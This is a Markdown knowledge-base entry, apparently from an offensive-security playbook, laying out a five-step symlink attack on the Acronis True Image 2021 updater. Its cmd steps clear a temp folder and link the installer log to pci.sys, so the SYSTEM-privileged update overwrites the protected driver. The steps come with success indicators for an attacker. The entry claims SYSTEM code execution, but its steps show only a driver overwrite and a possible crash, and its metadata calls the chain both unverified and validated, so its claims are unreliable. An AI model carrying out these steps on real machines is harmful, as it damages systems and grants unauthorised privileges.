---
id: acronis-lpe-symlink-update
tags:
  - lpe
  - symlink
  - acronis
  - privilege-escalation
  - file-overwrite
type: attack_chain
tools:
  - '[[tools/CreateSymlink]]'
tactics:
  - '[[Privilege Escalation]]'
commands:
  - '[[commands/rmdir-remove-acronis-directory]]'
  - '[[commands/mkdir-create-acronis-directory]]'
  - '[[commands/CreateSymlink-create-log-symlink]]'
verified: false
platforms:
  - Windows
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Clean-and-Prepare-Directory-for-Symlink]]'
  - '[[procedures/Create-Symlink-to-Target-System-File]]'
  - '[[procedures/Trigger-Acronis-Update-for-File-Overwrite]]'
step_count: 5
techniques:
  - '[[Exploitation for Privilege Escalation]]'
updated_at: '2025-12-14T17:29:36.758Z'
description: >-
  A multi-stage local privilege escalation exploiting a symlink vulnerability in
  Acronis True Image's update process to overwrite protected system files with
  SYSTEM privileges.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Privilege Escalation]]'
mitre_techniques:
  - '[[Exploitation for Privilege Escalation]]'
---
# Local Privilege Escalation in Acronis True Image via Symlink Attack on Update Log

Multi-stage attack chain demonstrating a complete local privilege escalation workflow by exploiting a symlink vulnerability in the Acronis True Image update mechanism. An attacker with local user access can manipulate the log file path during the software update to overwrite protected system files, such as drivers in C:\Windows\System32\drivers, leading to SYSTEM-level code execution.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 5 |
| Execution Time | ~10 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Prepare Environment] --> B[Create Symlink]
    B --> C[Trigger Update]
    C --> D[Privilege Escalation]

    style A fill:#f39c12
    style B fill:#e74c3c
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/CreateSymlink]]

### Target Environment

- Windows OS
- Acronis True Image Version 2021, Build 32010 installed
- Local user access to the system
- No elevated privileges required initially

### Initial Access Requirements

- Local non-admin user account
- Access to command prompt or PowerShell
- Ability to interact with the Acronis True Image UI

## Detailed Attack Procedures

### Step 1: Clean Existing Directory
procedure: [[procedures/Clean-and-Prepare-Directory-for-Symlink]]

**Objective**: Remove any existing Acronis DriverSetup directory to avoid conflicts and prepare the temp path for symlink creation.

**Instructions**: Execute [[commands/rmdir-remove-acronis-directory]] to delete the directory:

```cmd
rmdir /S /Q %temp%\Acronis\DriverSetup
```

**Expected Output**: No output if successful; the directory is removed.

**Success Indicators**:
- Directory %temp%\Acronis\DriverSetup no longer exists
- No error messages from the command

### Step 2: Create Parent Directory
procedure: [[procedures/Clean-and-Prepare-Directory-for-Symlink]]

**Objective**: Establish the parent directory structure needed for the symlink.

**Instructions**: Run [[commands/mkdir-create-acronis-directory]] to create the Acronis folder:

```cmd
mkdir %temp%\Acronis
```

**Expected Output**: No output if successful; the directory is created.

**Success Indicators**:
- %temp%\Acronis directory exists
- Permissions allow further operations

### Step 3: Create Symlink
procedure: [[procedures/Create-Symlink-to-Target-System-File]]

**Objective**: Set up a symbolic link from the log file path to a protected system file, redirecting future writes.

**Instructions**: Use [[commands/CreateSymlink-create-log-symlink]] to link the log path to the target driver:

```cmd
CreateSymlink %temp%\Acronis\DriverSetup\inst.log C:\Windows\System32\drivers\pci.sys
```

**Expected Output**: Success message or no output; symlink established.

**Success Indicators**:
- Symlink exists at %temp%\Acronis\DriverSetup\inst.log pointing to pci.sys
- Verify with dir /a %temp%\Acronis\DriverSetup

### Step 4: Initiate Update Download
procedure: [[procedures/Trigger-Acronis-Update-for-File-Overwrite]]

**Objective**: Start the update process in the Acronis UI to prepare for the installation phase.

**Instructions**: Open Acronis True Image, navigate to the Account tab, and click 'A new version is available' to download the latest version. No command-line action required.

**Expected Output**: Download progress shown in the UI.

**Success Indicators**:
- Update download initiates successfully
- No errors in the application

### Step 5: Execute Update Installation
procedure: [[procedures/Trigger-Acronis-Update-for-File-Overwrite]]

**Objective**: Trigger the installation, causing the SYSTEM-privileged process to write to the symlinked log and overwrite the target file.

**Instructions**: Once download completes, open the installer and click 'Update'. Monitor for installation completion.

**Expected Output**: Installation completes; target file (e.g., pci.sys) is overwritten.

**Success Indicators**:
- Installation finishes without errors
- Verify file overwrite by checking timestamp or hash of C:\Windows\System32\drivers\pci.sys
- Potential BSOD or system instability indicating successful overwrite; reboot to test escalation

## Attack Chain Summary

### Key Achievements

1. Clean preparation of user-writable temp path
2. Symlink creation redirecting privileged writes
3. Overwrite of protected system driver leading to LPE

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploitation for Privilege Escalation]] Exploitation for Privilege Escalation

### MITRE ATT&CK Tactics

- [[Privilege Escalation]] Privilege Escalation

---

*Last updated: 2023-10-01T00:00:00Z*
